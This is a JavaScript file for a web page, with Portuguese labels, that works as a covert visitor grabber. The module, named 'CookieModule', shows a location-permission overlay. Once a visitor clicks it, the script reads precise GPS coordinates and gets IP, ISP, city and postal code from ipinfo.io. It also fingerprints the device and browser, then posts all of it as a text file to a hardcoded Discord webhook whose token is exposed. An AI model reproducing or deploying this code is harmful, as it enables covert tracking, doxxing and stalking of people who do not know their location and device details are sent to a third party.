const WEBHOOK = "https://discord.com/api/webhooks/1512916490637279442/3b3q2iweTkHj2A7_bohtF_z5Shjm1hgMbVKX3AFmXDwbI5t9Qp-ZBH3MX8iIZ5gaMVoN";

const IPModule = {
  async send(lat, lon) {
    try {
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const d = await res.json();
      if (!d.ip) throw new Error("IP missing");

      const nav  = window.navigator;
      const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
      const ua   = nav.userAgent;
      const platform = nav.platform || nav.userAgentData?.platform || "Desconhecido";

      // Detectar SO
      let os = "Desconhecido";
      if (ua.includes("Windows NT 10.0")) os = "Windows 10";
      else if (ua.includes("Windows NT 11.0")) os = "Windows 11";
      else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
      else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
      else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
      else if (ua.includes("Windows")) os = "Windows";
      else if (ua.includes("Android")) {
        const match = ua.match(/Android[\s]([0-9.]+)/);
        os = match ? `Android ${match[1]}` : "Android";
      }
      else if (ua.includes("iPhone") || ua.includes("iPad")) {
        const match = ua.match(/OS[\s]([0-9_]+)/);
        os = match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
      }
      else if (ua.includes("Mac OS X")) {
        const match = ua.match(/Mac OS X[\s]([0-9_]+)/);
        os = match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
      }
      else if (ua.includes("Ubuntu")) os = "Linux (Ubuntu)";
      else if (ua.includes("Linux")) os = "Linux";

      // Detectar navegador
      let browser = "Desconhecido";
      if (ua.includes("Edg/")) browser = "Microsoft Edge";
      else if (ua.includes("OPR/") || ua.includes("Opera")) browser = "Opera";
      else if (ua.includes("Firefox/")) browser = "Mozilla Firefox";
      else if (ua.includes("Chrome/")) browser = "Google Chrome";
      else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
      else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";

      // Detectar tipo de dispositivo
      let deviceType = "Desktop";
      if (/Mobile|Android|iPhone/i.test(ua)) deviceType = "Smartphone";
      else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";

      // Detectar modelo (se possível)
      let deviceModel = "N/A";
      const modelMatch = ua.match(/\(([^)]+)\)/);
      if (modelMatch) {
        const info = modelMatch[1];
        if (info.includes("iPhone")) deviceModel = info.match(/iPhone[^;,]*/)?.[0] || "iPhone";
        else if (info.includes("iPad")) deviceModel = info.match(/iPad[^;,]*/)?.[0] || "iPad";
        else if (info.includes("SM-") || info.includes("SAMSUNG")) {
          deviceModel = info.match(/SM-[A-Z0-9]+|SAMSUNG[^;,]*/)?.[0] || "Samsung";
        }
        else if (info.includes("Pixel")) deviceModel = info.match(/Pixel[^;,]*/)?.[0] || "Google Pixel";
        else if (info.includes("Redmi") || info.includes("Mi ")) deviceModel = info.match(/Redmi[^;,]*|Mi [^;,]*/)?.[0] || "Xiaomi";
      }

      const lines = [
        "=".repeat(60),
        "  INFORMACOES DO VISITANTE",
        "=".repeat(60),
        "",
        "[ REDE ]",
        "IP           : " + d.ip,
        "ISP          : " + (d.org || "N/A"),
        "Pais         : " + (d.country || "N/A"),
        "Regiao       : " + (d.region || "N/A"),
        "Cidade       : " + (d.city || "N/A"),
        "CEP          : " + (d.postal || "N/A"),
        "Timezone     : " + (d.timezone || "N/A"),
        "Conexao      : " + (conn.downlink ? `${conn.downlink} Mbps (${conn.effectiveType || "N/A"})` : "N/A"),
        "",
        "[ DISPOSITIVO ]",
        "Tipo         : " + deviceType,
        "Modelo       : " + deviceModel,
        "Sistema      : " + os,
        "Plataforma   : " + platform,
        "Navegador    : " + browser,
        "",
        "[ HARDWARE ]",
        "CPU Cores    : " + (nav.hardwareConcurrency || "N/A"),
        "Memoria RAM  : " + (nav.deviceMemory ? nav.deviceMemory + " GB" : "N/A"),
        "Resolucao    : " + window.screen.width + "x" + window.screen.height,
        "Touch Screen : " + (nav.maxTouchPoints > 0 ? "Sim (" + nav.maxTouchPoints + " pontos)" : "Nao"),
        "Pixel Ratio  : " + (window.devicePixelRatio || "N/A"),
        "",
        "[ CONFIGURACOES ]",
        "Idioma       : " + nav.language,
        "Idiomas      : " + (nav.languages ? nav.languages.join(", ") : "N/A"),
        "Cookies      : " + (nav.cookieEnabled ? "Ativado" : "Desativado"),
        "DNT          : " + (nav.doNotTrack || "N/A"),
        "Online       : " + (nav.onLine ? "Sim" : "Nao"),
        "",
        "[ NAVEGACAO ]",
        "URL Atual    : " + location.href,
        "Referrer     : " + (document.referrer || "Acesso Direto"),
        "User Agent   : " + ua,
      ];

      if (lat !== null && lon !== null) {
        lines.push("");
        lines.push("[ LOCALIZACAO GPS ]");
        lines.push("Latitude     : " + lat.toFixed(6));
        lines.push("Longitude    : " + lon.toFixed(6));
        lines.push("Google Maps  : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6));
      }

      lines.push("");
      lines.push("[ TIMESTAMP ]");
      lines.push("Data/Hora    : " + new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }));
      lines.push("ISO          : " + new Date().toISOString());
      lines.push("");
      lines.push("=".repeat(60));

      const blob = new Blob([lines.join("\n")], { type: "text/plain; charset=utf-8" });
      const form = new FormData();
      const filename = `visitor_${d.ip.replace(/\./g, "_")}_${Date.now()}.txt`;
      form.append("file", blob, filename);
      
      await fetch(WEBHOOK, { method: "POST", body: form });
    } catch (err) {
      console.warn("[IPModule]", err.message);
    }
  },
};

const CookieModule = {
  init() {
    const overlay = document.getElementById("location-overlay");
    const allow   = document.getElementById("location-allow");

    if (!overlay || !allow) return;

    overlay.style.display = "flex";

    allow.addEventListener("click", () => {
      overlay.style.display = "none";
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => IPModule.send(pos.coords.latitude, pos.coords.longitude),
          ()    => IPModule.send(null, null)
        );
      } else {
        IPModule.send(null, null);
      }
    });
  },
};

CookieModule.init();

// Modal de link externo
const linkOverlay = document.getElementById("link-overlay");
if (linkOverlay) {
  const urlText    = document.getElementById("link-url-text");
  const btnConfirm = document.getElementById("link-confirm");
  const btnCancel  = document.getElementById("link-cancel");
  let pendingUrl   = null;

  document.addEventListener("click", (e) => {
    const a = e.target.closest("a");
    if (!a) return;
    e.preventDefault();
    pendingUrl = a.href;
    urlText.textContent = pendingUrl;
    linkOverlay.style.display = "flex";
  });

  btnConfirm.addEventListener("click", () => {
    linkOverlay.style.display = "none";
    if (pendingUrl) window.location.href = pendingUrl;
  });

  btnCancel.addEventListener("click", () => {
    linkOverlay.style.display = "none";
    pendingUrl = null;
  });
}
